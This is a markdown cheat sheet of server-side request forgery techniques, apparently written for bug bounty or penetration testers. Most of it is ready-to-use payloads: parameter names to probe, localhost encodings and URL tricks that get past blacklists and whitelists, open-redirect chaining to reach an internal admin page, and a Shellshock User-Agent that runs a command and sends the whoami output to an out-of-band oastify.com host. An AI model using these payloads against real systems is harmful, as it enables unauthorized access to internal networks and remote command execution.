## Index:

1. [SSRF Vulnerability Overview](#ssrf)
2. [Common SSRF Endpoints](#common-ssrf-endpoints)
3. [Tips](#tips)
   - [Port and Path Exploitation](#port-and-path-exploitation)
   - [File Uploads](#file-uploads)
   - [Internal Private IPv4 Networks](#internal-private-ipv4-networks)
4. [Common Method (API Parameter)](#common-method-api-parameter)
5. [Blind Method](#blind-method)
   - [Using Burp Collaborator in Referer Header](#using-burp-collaborator-in-referer-header)
   - [Shellshock Exploitation via SSRF](#shellshock-exploitation-via-ssrf)
6. [Bypassing Common SSRF Defenses](#bypassing-common-ssrf-defenses)
   - [SSRF with Blacklist-Based Input Filters](#ssrf-with-blacklist-based-input-filters)
   - [SSRF with Whitelist-Based Input Filters](#ssrf-with-whitelist-based-input-filters)
     - [Embedding Credentials in a URL](#embedding-credentials-in-a-url)
     - [Using URL Fragment for Bypass](#using-url-fragment-for-bypass)
     - [DNS Naming Hierarchy Bypass](#dns-naming-hierarchy-bypass)
   - [Bypassing SSRF Filters via Open Redirection](#bypassing-ssrf-filters-via-open-redirection)

## SSRF
This vulnerability helps attacker to send request to back-end systems. To learn >> https://www.hackerone.com/application-security/how-server-side-request-forgery-ssrf

## Common SSRF Endpoints
```
dest=
path=
window=
next=
site=
reference=
data=
load=
html=
validate=
page=
return=
callback=
domain=
feed=
view=
dir=
request-baskets=
dict=
pdf=
file=
imageuri=
url=
key=
.json=
oauth=
redirect=
api=
dashboard=
config.=
```
## Tips

### Port and Path Exploitation
1. Try with port number, path.

### File Uploads
2. File uploads: instead of uploading a file, try sending a URL and see if it downloads the content of the URL. Example: https://hackerone.com/reports/713

### Internal Private IPv4 Networks
3. If you do want to look for internal services, here’s a list of private IPv4 networks that you could scan for services:

    - 10.0.0.0/8
    - 127.0.0.1/32
    - 172.16.0.0/12
    - 192.168.0.0/16

## Common Method (API Parameter)
```txt
http://localhost/
http://127.0.0.1/
```
## Blind Method
#### Just place burpcollaborator server in referer header
```txt
Referer: http://burpcollaborator.net
```
#### Shellshock exploitation via SSRF
```txt
User-Agent: () { :; }; /usr/bin/nslookup $(whoami).3kobqoj8uv6qbwwlkaf5cvzr1i79v0jp.oastify.com >> Change Uger-Agent info
Referer: http://192.168.0.$1$:8080 >> Bruteforce the ip
```
## Bypassing common SSRF defenses
_____________________________________
### SSRF with blacklist-based input filters
```txt
http://127.1
http://2130706433
http://017700000001
http://127.0.0.1:21/?%0A >> You can change port number if needed.
http://[::]:80/ 
http://spoofed.burpcollaborator.net
```
### SSRF with whitelist-based input filters
#### You can embed credentials in a URL before the hostname, using the @ character. For example:
```txt
    https://expected-host:fakepassword@evil-host
    https://expected-host:fakepassword@burpcollaborator.net
```
#### You can use the # character to indicate a URL fragment. For example:
```txt
    https://evil-host#@expected-host
    https://burpcollaborator.net#@google.com
```
Double URL-encode # to %2523.
#### You can leverage the DNS naming hierarchy to place required input into a fully-qualified DNS name that you control. For example:
```txt
    https://expected-host.evil-host
    https://google.com.burpcollaborator.net
```
### Bypassing SSRF filters via open redirection
#### For example, the application contains an open redirection vulnerability in which the following URL (http://evil-user.net):
```txt
/product/nextProduct?currentProductId=6&path=http://evil-user.net
```
#### You can leverage the open redirection vulnerability to bypass the URL filter, and exploit the SSRF vulnerability as follows: 
```txt
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&path=http://192.168.0.68/admin
```
